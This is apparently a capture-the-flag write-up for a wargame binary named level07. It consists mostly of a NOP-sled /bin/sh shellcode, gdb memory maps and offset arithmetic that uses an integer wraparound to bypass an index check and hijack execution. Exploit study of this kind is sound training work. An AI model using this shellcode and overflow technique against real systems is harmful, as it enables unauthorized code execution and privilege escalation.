```Shell
export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

Address of the bufffer:

```
(gdb) b *0x080489a1       <====================== Breakpoint at the end of main
Breakpoint 4 at 0x80489a1
(gdb) r
Starting program: /home/users/level07/level07
...
Input command: store
 Number: 1234
 Index: 1
 Completed store command successfully

Breakpoint 4, 0x080489a1 in main ()
(gdb) i proc map
process 1688
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fd8000 0xf7fdb000     0x3000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xfffdd000,0xffffdfff, 1234
0xffffd548
1 pattern found.
```

Here we have the pattern at `0xffffd548` which is at the index 1 (\* 4) of the buffer.
So the start of the buffer is at `0xffffd548` - 4 : `0xffffd544`

0xffffd544 ===> 4294956356

buff + 400 = 0xFFFFD6D4, this is the end of the buffer

(gdb) x/20x 0xffffd6d4
0xffffd6d4: 0x00000000 0x64616572 0x00000000 0x00000000
0xffffd6e4: 0x00000000 0x00000000 0x599ca500 0xf7feb620
0xffffd6f4: 0x00000000 0x08048a09 0xf7fceff4 0x00000000
0xffffd704: 0x00000000 0x00000000 0xf7e45513 0x00000001
0xffffd714: 0xffffd7a4 0xffffd7ac 0xf7fd3000 0x00000000

try : 0xffffd704 + 8
4294956812

buf 0xffffd544 ===> 4294956356

[address where to write] - [address of the buffer]
4294956356 - 4294956812 = -456
-456 /4 = -114

114 modulo 3 == 0

So we will do an overflow:
To counter the \* 4 we do a
UINT_MAX / 4 : 4294967295 /4 ~~ 1073741824

1073741824 + 114
1073741938

Address in the middle of the shellcode : 0xffffd5c8
